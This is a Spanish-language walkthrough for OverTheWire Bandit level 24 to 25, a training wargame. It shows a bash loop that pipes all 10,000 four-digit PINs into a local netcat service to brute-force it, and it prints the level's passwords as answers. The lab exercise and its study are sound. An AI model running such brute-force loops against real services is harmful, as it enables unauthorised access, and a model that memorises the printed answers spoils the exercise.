# Bandit Level 24 → Level 25

## Objetivo
Un demonio está escuchando en el puerto 30002 y te dará la contraseña para bandit25 si se le da la contraseña para bandit24 y un código secreto numérico de 4 dígitos. No hay forma de recuperar el código PIN, excepto repasando todas las 10000 combinaciones, lo que se denomina forzar bruscamente.
No es necesario crear nuevas conexiones cada vez.

## Datos de acceso al nivel
bandit.labs.overthewire.org
bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

## Solución
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 3523
Wrong! Please enter the correct pincode. Try again.
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 2346
Wrong! Please enter the correct pincode. Try again.
^C
bandit24@bandit:~$ for i in {0000..0005}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0001
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0002
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0003
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0004
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0005
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

## Notas adicionales
| Comando | Descripción |
|--------|--------|
| {0000..9999} | Recorre todas las posibles combinaciones en el rango establecido |

## Referencias
[Shell Scripting Tutorial](https://www.shellscript.sh/)